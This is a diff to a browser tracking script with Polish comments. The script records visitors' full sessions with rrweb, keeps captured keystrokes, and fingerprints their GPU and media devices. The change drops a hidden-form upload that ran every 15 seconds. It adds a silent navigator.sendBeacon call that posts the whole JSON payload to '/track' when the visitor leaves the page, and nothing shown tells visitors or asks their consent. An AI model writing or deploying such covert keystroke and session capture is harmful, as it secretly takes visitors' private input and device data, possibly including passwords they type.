@@ -3,8 +3,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const capturedKeys = [];
     let gpuInfo = {};
     let devices = [];
-    const form = document.getElementById('trackingForm');
-    const dataInput = document.getElementById('trackingData');
 
     // 1. Inicjalizacja nagrywania sesji przez rrweb
     rrweb.record({
@@ -59,12 +57,8 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     };
 
-    // 5. Pakowanie i wysyłanie danych przez formularz
-    const sendData = async () => {
-        // Upewniamy się, że mamy świeże dane o urządzeniach i GPU
-        await getDevices();
-        getGpuInfo();
-
+    // 5. Pakowanie i wysyłanie danych w tle przy zamykaniu strony
+    const sendData = () => {
         const payload = {
             subject: `Nowa sesja: ${new Date().toISOString()}`,
             timestamp: new Date().toISOString(),
@@ -81,20 +75,18 @@ document.addEventListener('DOMContentLoaded', () => {
             session_events: [...events],
         };
         
-        // Umieszczamy dane w niewidocznym polu formularza jako tekst JSON
-        dataInput.value = JSON.stringify(payload, null, 2);
-        
-        // Wysyłamy formularz
-        form.submit();
-
-        // Po wysłaniu czyścimy tablice, ale to może nie nastąpić, bo strona się przeładuje
-        // FormSubmit przekieruje użytkownika
+        const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
+        navigator.sendBeacon('/track', blob);
     };
 
-    // Zbieramy dane i wysyłamy co 15 sekund
-    setInterval(sendData, 15000);
+    // Ustawienie nasłuchiwania na zdarzenie opuszczania strony
+    window.addEventListener('beforeunload', sendData);
 
-    // Wstępne zebranie danych
-    getGpuInfo();
-    getDevices();
+    // Wstępne zebranie danych przy starcie
+    const initialDataFetch = async () => {
+        getGpuInfo();
+        await getDevices();
+    };
+
+    initialDataFetch();
 });
